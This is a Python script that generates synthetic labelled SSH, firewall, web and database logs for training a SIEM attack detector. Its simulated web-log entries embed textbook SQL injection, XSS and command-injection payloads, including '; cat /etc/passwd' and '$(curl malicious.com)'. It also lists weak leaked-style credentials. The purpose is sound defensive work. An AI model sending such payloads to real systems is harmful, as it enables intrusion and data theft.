"""
Enhanced Synthetic Data Generator for SIEM ML Training
Generates realistic log data with attack patterns including sequences for detection
"""

import random
import json
from datetime import datetime, timedelta
import os

random.seed(42)

USERS = ['admin', 'root', 'user', 'test', 'guest', 'oracle', 'mysql', 'postgres', 'www-data', 'nginx', 'apache', 'backup', 'dbadmin', 'support', 'service']

IPS = [f'192.168.{random.randint(1,255)}.{random.randint(1,255)}' for _ in range(50)]
EXTERNAL_IPS = [f'{random.randint(10,200)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}' for _ in range(500)]
SAFE_IPS = ['8.8.8.8', '1.1.1.1', '208.67.222.222', '9.9.9.9']

def generate_normal_auth_log(timestamp, user=None, ip=None, success=True):
    user = user or random.choice(USERS)
    ip = ip or random.choice(IPS)
    
    if success:
        message = f"Oct {timestamp.day:02d} {timestamp.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip} port {random.randint(40000,60000)} ssh2"
    else:
        message = f"Oct {timestamp.day:02d} {timestamp.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Failed password for invalid user admin from {ip} port {random.randint(40000,60000)} ssh2"
    
    return {
        'timestamp': timestamp.strftime('%b %d %H:%M:%S'),
        'source_ip': ip,
        'log_type': 'ssh_auth',
        'attack_type': 'safe',
        'message': message,
        'is_attack': False,
        'user': user,
        'success': success
    }

def generate_bruteforce_sequence(timestamp, target_user=None, attacker_ip=None):
    target_user = target_user or random.choice(USERS)
    attacker_ip = attacker_ip or random.choice(EXTERNAL_IPS)
    
    logs = []
    num_failures = random.randint(5, 20)
    
    for i in range(num_failures):
        ts = timestamp + timedelta(seconds=i*2)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Failed password for {target_user} from {attacker_ip} port {random.randint(40000,60000)} ssh2"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'bruteforce',
            'message': message,
            'is_attack': True,
            'user': target_user,
            'success': False,
            'attack_sequence_id': f'bruteforce_{attacker_ip}_{target_user}'
        })
    
    if random.random() > 0.3:
        ts = timestamp + timedelta(seconds=num_failures*2)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Accepted password for {target_user} from {attacker_ip} port {random.randint(40000,60000)} ssh2"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'bruteforce',
            'message': message,
            'is_attack': True,
            'user': target_user,
            'success': True,
            'attack_sequence_id': f'bruteforce_{attacker_ip}_{target_user}'
        })
    
    return logs

def generate_password_spray(timestamp):
    target_ip = random.choice(EXTERNAL_IPS)
    logs = []
    num_users = random.randint(20, 50)
    users = random.sample(USERS, min(num_users, len(USERS)))
    
    for i, user in enumerate(users):
        ts = timestamp + timedelta(seconds=i*1)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Failed password for {user} from {target_ip} port {random.randint(40000,60000)} ssh2"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': target_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'password_spray',
            'message': message,
            'is_attack': True,
            'user': user,
            'success': False,
            'attack_sequence_id': f'password_spray_{target_ip}'
        })
    
    return logs

def generate_ddos_sequence(timestamp):
    attacker_ips = random.sample(EXTERNAL_IPS, random.randint(50, 200))
    logs = []
    
    for i, ip in enumerate(attacker_ips):
        ts = timestamp + timedelta(milliseconds=i*10)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server kernel: [IPTABLES DROP] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC={ip} DST=10.0.0.1 PROTO=TCP SYN"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': ip,
            'log_type': 'iptables',
            'attack_type': 'ddos',
            'message': message,
            'is_attack': True,
            'attack_sequence_id': f'ddos_{timestamp.strftime("%Y%m%d%H%M")}'
        })
    
    return logs

def generate_port_scan(timestamp):
    scanner_ip = random.choice(EXTERNAL_IPS)
    logs = []
    ports = random.sample(range(1, 1024), random.randint(20, 100))
    
    for i, port in enumerate(ports):
        ts = timestamp + timedelta(milliseconds=i*50)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server kernel: [IPTABLES DROP] IN=eth0 OUT= SRC={scanner_ip} DST=10.0.0.1 PROTO=TCP DPT={port}"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': scanner_ip,
            'log_type': 'iptables',
            'attack_type': 'port_scan',
            'message': message,
            'is_attack': True,
            'port': port,
            'attack_sequence_id': f'port_scan_{scanner_ip}'
        })
    
    return logs

def generate_sql_injection(timestamp):
    attacker_ip = random.choice(EXTERNAL_IPS)
    
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1' UNION SELECT * FROM passwords--",
        "admin'--",
        "1' AND '1'='1",
    ]
    
    logs = []
    for i, payload in enumerate(random.sample(payloads, min(5, len(payloads)))):
        ts = timestamp + timedelta(seconds=i)
        message = f'{attacker_ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")}] "GET /login?user={payload} HTTP/1.1" 200 1234'
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'apache',
            'attack_type': 'sql_injection',
            'message': message,
            'is_attack': True,
            'attack_sequence_id': f'sql_injection_{attacker_ip}'
        })
    
    return logs

def generate_xss_attack(timestamp):
    attacker_ip = random.choice(EXTERNAL_IPS)
    
    payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
    ]
    
    logs = []
    for i, payload in enumerate(random.sample(payloads, min(3, len(payloads)))):
        ts = timestamp + timedelta(seconds=i)
        message = f'{attacker_ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")}] "GET /comment?text={payload} HTTP/1.1" 200 5678'
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'nginx',
            'attack_type': 'xss_attack',
            'message': message,
            'is_attack': True,
            'attack_sequence_id': f'xss_{attacker_ip}'
        })
    
    return logs

def generate_credential_stuffing(timestamp):
    attacker_ip = random.choice(EXTERNAL_IPS)
    logs = []
    num_attempts = random.randint(10, 30)
    
    leaked_creds = [
        ('admin', 'password123'),
        ('root', 'toor'),
        ('test', 'test123'),
        ('user', 'password1'),
        ('oracle', 'oracle123')
    ]
    
    for i in range(num_attempts):
        ts = timestamp + timedelta(seconds=i*2)
        user, pwd = random.choice(leaked_creds)
        success = random.random() > 0.9
        status = "Accepted" if success else "Failed"
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: {status} password for {user} from {attacker_ip} port {random.randint(40000,60000)} ssh2"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'credential_stuffing',
            'message': message,
            'is_attack': True,
            'user': user,
            'success': success,
            'attack_sequence_id': f'credential_stuffing_{attacker_ip}'
        })
    
    return logs

def generate_mfa_fatigue(timestamp):
    target_ip = random.choice(EXTERNAL_IPS)
    user = random.choice(USERS)
    logs = []
    num_requests = random.randint(10, 50)
    
    for i in range(num_requests):
        ts = timestamp + timedelta(seconds=i*3)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: MFA push sent to phone for {user} from {target_ip}"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': target_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'mfa_fatigue',
            'message': message,
            'is_attack': True,
            'user': user,
            'attack_sequence_id': f'mfa_fatigue_{target_ip}_{user}'
        })
    
    if random.random() > 0.5:
        ts = timestamp + timedelta(seconds=num_requests*3)
        message = f"Oct {ts.day:02d} {ts.strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: MFA push approved for {user} from {target_ip}"
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': target_ip,
            'log_type': 'ssh_auth',
            'attack_type': 'mfa_fatigue',
            'message': message,
            'is_attack': True,
            'user': user,
            'success': True,
            'attack_sequence_id': f'mfa_fatigue_{target_ip}_{user}'
        })
    
    return logs

def generate_command_injection(timestamp):
    attacker_ip = random.choice(EXTERNAL_IPS)
    
    payloads = [
        '; cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(curl malicious.com)',
    ]
    
    logs = []
    for i, payload in enumerate(payloads):
        ts = timestamp + timedelta(seconds=i)
        message = f'{attacker_ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")}] "GET /shell?cmd={payload} HTTP/1.1" 200 -'
        logs.append({
            'timestamp': ts.strftime('%b %d %H:%M:%S'),
            'source_ip': attacker_ip,
            'log_type': 'apache',
            'attack_type': 'command_injection',
            'message': message,
            'is_attack': True,
            'attack_sequence_id': f'cmd_injection_{attacker_ip}'
        })
    
    return logs

def generate_normal_webserver_log(timestamp):
    ip = random.choice(IPS + SAFE_IPS)
    paths = ['/index.html', '/api/users', '/login', '/static/css/style.css', '/images/logo.png', '/health', '/api/data']
    methods = ['GET', 'GET', 'GET', 'POST', 'GET']
    status_codes = [200, 200, 200, 302, 404]
    
    method = random.choice(methods)
    path = random.choice(paths)
    status = random.choice(status_codes)
    size = random.randint(100, 10000)
    
    message = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S")}] "{method} {path} HTTP/1.1" {status} {size}'
    
    return {
        'timestamp': timestamp.strftime('%b %d %H:%M:%S'),
        'source_ip': ip,
        'log_type': random.choice(['apache', 'nginx']),
        'attack_type': 'safe',
        'message': message,
        'is_attack': False
    }

def generate_normal_firewall_log(timestamp):
    src_ip = random.choice(IPS + SAFE_IPS)
    dst_ip = random.choice(IPS)
    action = random.choice(['ALLOW', 'BLOCK'])
    dpt = random.choice([80, 443, 22, 3306, 5432])
    
    message = f"Oct {timestamp.day:02d} {timestamp.strftime('%H:%M:%S')} fw kernel: [UFW {action}] IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO=TCP DPT={dpt}"
    
    return {
        'timestamp': timestamp.strftime('%b %d %H:%M:%S'),
        'source_ip': src_ip,
        'log_type': 'iptables',
        'attack_type': 'safe',
        'message': message,
        'is_attack': False
    }

def generate_normal_database_log(timestamp):
    queries = [
        'SELECT * FROM users WHERE id=1',
        'INSERT INTO logs (msg) VALUES ("test")',
        'UPDATE sessions SET last_active=NOW() WHERE user_id=1',
        'DELETE FROM cache WHERE expires < NOW()'
    ]
    
    message = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")} Query: {random.choice(queries)}'
    
    return {
        'timestamp': timestamp.strftime('%b %d %H:%M:%S'),
        'source_ip': random.choice(IPS),
        'log_type': random.choice(['mysql_query', 'postgres_statement']),
        'attack_type': 'safe',
        'message': message,
        'is_attack': False
    }

def generate_auth_dataset(num_samples=25000):
    all_logs = []
    start_date = datetime(2024, 1, 1)
    
    for i in range(num_samples):
        timestamp = start_date + timedelta(hours=random.randint(0, 24*30),
                                          minutes=random.randint(0, 59),
                                          seconds=random.randint(0, 59))
        
        if random.random() < 0.2:
            attack_type = random.choice([
                generate_bruteforce_sequence,
                generate_password_spray,
                generate_credential_stuffing,
                generate_mfa_fatigue
            ])
            logs = attack_type(timestamp)
            all_logs.extend(logs)
        else:
            all_logs.append(generate_normal_auth_log(timestamp))
    
    return all_logs

def generate_firewall_dataset(num_samples=25000):
    all_logs = []
    start_date = datetime(2024, 1, 1)
    
    for i in range(num_samples):
        timestamp = start_date + timedelta(hours=random.randint(0, 24*30),
                                          minutes=random.randint(0, 59),
                                          seconds=random.randint(0, 59))
        
        if random.random() < 0.15:
            attack_type = random.choice([
                generate_ddos_sequence,
                generate_port_scan
            ])
            logs = attack_type(timestamp)
            all_logs.extend(logs)
        else:
            all_logs.append(generate_normal_firewall_log(timestamp))
    
    return all_logs

def generate_webserver_dataset(num_samples=25000):
    all_logs = []
    start_date = datetime(2024, 1, 1)
    
    for i in range(num_samples):
        timestamp = start_date + timedelta(hours=random.randint(0, 24*30),
                                          minutes=random.randint(0, 59),
                                          seconds=random.randint(0, 59))
        
        if random.random() < 0.15:
            attack_type = random.choice([
                generate_sql_injection,
                generate_xss_attack,
                generate_command_injection
            ])
            logs = attack_type(timestamp)
            all_logs.extend(logs)
        else:
            all_logs.append(generate_normal_webserver_log(timestamp))
    
    return all_logs

def generate_database_dataset(num_samples=15000):
    all_logs = []
    start_date = datetime(2024, 1, 1)
    
    attack_patterns = [
        ("' OR '1'='1", 'sql_injection'),
        ("UNION SELECT", 'sql_injection'),
        ("DROP TABLE", 'sql_injection'),
        ("GRANT ALL", 'privilege_escalation'),
    ]
    
    for i in range(num_samples):
        timestamp = start_date + timedelta(hours=random.randint(0, 24*30),
                                          minutes=random.randint(0, 59),
                                          seconds=random.randint(0, 59))
        
        if random.random() < 0.1:
            pattern, attack = random.choice(attack_patterns)
            attacker_ip = random.choice(EXTERNAL_IPS)
            message = f"{timestamp.strftime('%Y-%m-%dT%H:%M:%S')} ERROR: {pattern} detected from {attacker_ip}"
            all_logs.append({
                'timestamp': timestamp.strftime('%b %d %H:%M:%S'),
                'source_ip': attacker_ip,
                'log_type': random.choice(['mysql_error', 'postgres_error']),
                'attack_type': attack,
                'message': message,
                'is_attack': True
            })
        else:
            all_logs.append(generate_normal_database_log(timestamp))
    
    return all_logs

if __name__ == '__main__':
    os.makedirs('data', exist_ok=True)
    
    print("Generating enhanced datasets...")
    
    print("Generating auth dataset...")
    auth_data = generate_auth_dataset(25000)
    with open('data/auth_dataset_v2.json', 'w') as f:
        json.dump(auth_data, f, indent=2)
    print(f"  Generated {len(auth_data)} auth logs")
    
    print("Generating firewall dataset...")
    firewall_data = generate_firewall_dataset(25000)
    with open('data/firewall_dataset_v2.json', 'w') as f:
        json.dump(firewall_data, f, indent=2)
    print(f"  Generated {len(firewall_data)} firewall logs")
    
    print("Generating webserver dataset...")
    webserver_data = generate_webserver_dataset(25000)
    with open('data/webserver_dataset_v2.json', 'w') as f:
        json.dump(webserver_data, f, indent=2)
    print(f"  Generated {len(webserver_data)} webserver logs")
    
    print("Generating database dataset...")
    database_data = generate_database_dataset(20000)
    with open('data/database_dataset_v2.json', 'w') as f:
        json.dump(database_data, f, indent=2)
    print(f"  Generated {len(database_data)} database logs")
    
    print("\nGenerating combined training dataset...")
    all_data = auth_data + firewall_data + webserver_data + database_data
    random.shuffle(all_data)
    with open('data/combined_training.json', 'w') as f:
        json.dump(all_data, f, indent=2)
    print(f"  Total: {len(all_data)} logs")
    
    attack_counts = {}
    for log in all_data:
        at = log.get('attack_type', 'unknown')
        attack_counts[at] = attack_counts.get(at, 0) + 1
    
    print("\nAttack type distribution:")
    for at, count in sorted(attack_counts.items(), key=lambda x: -x[1]):
        print(f"  {at}: {count}")
    
    print("\nDataset generation complete!")
